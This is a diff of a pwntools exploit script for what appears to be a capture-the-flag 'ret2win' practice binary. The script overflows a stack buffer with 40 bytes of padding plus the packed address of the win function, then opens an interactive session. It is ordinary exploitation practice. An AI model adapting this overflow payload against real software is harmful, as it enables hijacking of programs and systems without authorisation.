@@ -1,7 +1,7 @@
 from pwn import *
+from pwnlib.util.packing import p64
 
-# Context setup
-exe = ELF('/a2524051-f9be-41f0-ad00-5d4593ff565a-1784741501/ring_the_bell') # Adjust path if needed
+exe = ELF('/home/jerry/Downloads/ret2win/ret2win') # Adjust path if needed
 context.binary = exe
 context.terminal = ['tmux', 'splitw', '-h']
 
@@ -13,25 +13,14 @@ def start(argv=[], *a, **kw):
     else:
         return process([exe.path] + argv, *a, **kw)
 
-gdbscript = '''
-init-pwndbg
-b *bell
-continue
-'''.format(**locals())
+gdbscript = ''''''
 
 io = start()
+#-----Exploit-----ls
 
-# -----Exploit-----
+win_addr = exe.symbols['ret2win']
 
-
-offset = 40 
-
-win_addr = 0x0040176d # Start of bell()
-
-payload = flat(
-    b'A' * offset,
-    win_addr
-)
+payload = b'A' * 40 + p64(win_addr)
 
 io.sendline(payload)
 io.interactive()
